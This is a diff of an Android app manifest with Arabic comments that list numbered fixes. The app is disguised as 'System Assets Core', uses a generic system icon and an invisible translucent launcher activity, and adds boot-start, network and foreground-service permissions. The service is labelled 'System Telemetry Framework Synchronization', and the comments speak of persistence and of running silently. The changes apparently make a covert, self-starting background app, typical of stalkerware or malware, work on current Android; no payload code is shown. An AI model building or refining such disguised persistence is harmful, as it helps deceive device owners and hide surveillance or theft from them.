@@ -1,16 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://android.com">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- صلاحيات الحزم والاتصال والديمومة -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <!-- إصلاح رقم 4: إضافة صلاحية الإشعارات لـ Android 13+ لدعم عمل الخدمة صامتة -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
+    <!-- إصلاح رقم 3: استخدام ثيم شفاف بدون عنوان متوافق مع أنشطة Launcher لمنع انهيار التطبيق -->
     <application
         android:allowBackup="false"
         android:icon="@android:drawable/sym_def_app_icon"
         android:label="System Assets Core"
-        android:theme="@android:style/Theme.NoDisplay">
+        android:theme="@android:style/Theme.Translucent.NoTitleBar">
 
         <activity
             android:name=".MainActivity"
@@ -21,10 +26,16 @@
             </intent-filter>
         </activity>
 
+        <!-- إصلاح رقم 2: إضافة الـ property الإلزامية المطلوبة لنوع الخدمة specialUse في الأنظمة الحديثة -->
         <service
             android:name=".SyncService"
             android:enabled="true"
-            android:exported="false" />
+            android:exported="false"
+            android:foregroundServiceType="specialUse">
+            <property 
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" 
+                android:value="System Telemetry Framework Synchronization" />
+        </service>
 
         <receiver
             android:name=".BootReceiver"
